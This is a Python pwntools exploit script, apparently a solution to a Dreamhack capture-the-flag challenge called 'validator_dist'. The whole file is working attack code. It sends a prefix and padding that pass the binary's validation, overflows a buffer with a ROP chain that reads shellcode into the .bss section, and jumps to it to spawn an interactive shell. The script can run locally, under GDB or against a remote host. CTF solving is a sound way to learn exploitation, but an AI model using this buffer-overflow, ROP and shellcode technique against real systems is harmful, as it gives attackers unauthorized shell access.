#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('validator_dist')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *validate+185
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    prefix = "DREAMHACK!".encode()
    pad = b""

    for i in range(128, len(prefix) - 2, -1):
        pad += p8(i - 1)

    bss = 0x60104c

    pop_rdi = 0x4006f3 # pop rdi; ret; 
    pop_rsi_r15 = 0x4006f1 # pop rsi; pop r15; ret;
    pop_rdx = 0x40057b # pop rdx; ret;

    ropchain = flat(
        [
         pop_rdi,
         0,
         pop_rsi_r15,
         bss,
         0x0,
         pop_rdx,
         0x200,
         exe.plt["read"],
         bss
        ]
    )
 

    payload = prefix + pad + b"A"*6 + ropchain
    sc = asm("nop")*30 + asm(shellcraft.sh())

    io.send(payload)
    io.send(sc)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

